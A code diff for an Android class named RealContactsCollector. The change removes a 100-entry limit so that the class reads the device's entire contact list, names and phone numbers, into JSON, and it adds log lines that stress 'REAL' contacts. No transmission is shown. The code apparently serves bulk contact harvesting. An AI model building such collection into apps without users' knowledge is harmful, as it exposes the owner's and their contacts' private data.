@@ -20,7 +20,7 @@ public class RealContactsCollector {
         Cursor cursor = null;
         
         try {
-            Log.d(TAG, "📇 Collecting real contacts...");
+            Log.d(TAG, "📇 Collecting REAL contacts from device...");
             
             String[] projection = new String[]{
                 ContactsContract.Contacts._ID,
@@ -33,36 +33,47 @@ public class RealContactsCollector {
                 projection,
                 null,
                 null,
-                ContactsContract.Contacts.DISPLAY_NAME + " ASC LIMIT 100"
+                ContactsContract.Contacts.DISPLAY_NAME + " ASC"
             );
             
             if (cursor != null && cursor.moveToFirst()) {
+                int count = 0;
                 do {
                     String contactId = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
                     String displayName = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
                     int hasPhoneNumber = cursor.getInt(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.HAS_PHONE_NUMBER));
                     
-                    JSONObject contact = new JSONObject();
-                    contact.put("name", displayName != null ? displayName : "Unknown");
-                    contact.put("phone_numbers", new JSONArray());
-                    
-                    if (hasPhoneNumber > 0) {
-                        JSONArray phoneNumbers = getPhoneNumbers(contactId);
-                        contact.put("phone_numbers", phoneNumbers);
+                    // Only process contacts with real names
+                    if (displayName != null && !displayName.trim().isEmpty()) {
+                        JSONObject contact = new JSONObject();
+                        contact.put("id", contactId);
+                        contact.put("name", displayName.trim());
+                        contact.put("phone_numbers", new JSONArray());
+                        
+                        if (hasPhoneNumber > 0) {
+                            JSONArray phoneNumbers = getPhoneNumbers(contactId);
+                            contact.put("phone_numbers", phoneNumbers);
+                        }
+                        
+                        contactsList.put(contact);
+                        count++;
+                        
+                        if (count <= 5) {
+                            Log.d(TAG, "👤 REAL Contact: " + displayName);
+                        }
                     }
                     
-                    contactsList.put(contact);
-                    Log.d(TAG, "👤 Contact: " + displayName);
-                    
                 } while (cursor.moveToNext());
+                
+                Log.d(TAG, "✅ Collected " + count + " REAL contacts from device");
+            } else {
+                Log.w(TAG, "📭 No REAL contacts found in device");
             }
             
-            Log.d(TAG, "✅ Collected " + contactsList.length() + " real contacts");
-            
         } catch (SecurityException e) {
-            Log.e(TAG, "❌ Contacts permission denied: " + e.getMessage());
+            Log.e(TAG, "❌ Contacts permission denied - NO CONTACTS DATA COLLECTED: " + e.getMessage());
         } catch (Exception e) {
-            Log.e(TAG, "❌ Error reading contacts: " + e.getMessage());
+            Log.e(TAG, "❌ Error reading REAL contacts: " + e.getMessage());
         } finally {
             if (cursor != null) {
                 cursor.close();
@@ -95,7 +106,7 @@ public class RealContactsCollector {
             }
             
         } catch (Exception e) {
-            Log.e(TAG, "❌ Error reading phone numbers: " + e.getMessage());
+            Log.e(TAG, "❌ Error reading REAL phone numbers: " + e.getMessage());
         } finally {
             if (phoneCursor != null) {
                 phoneCursor.close();
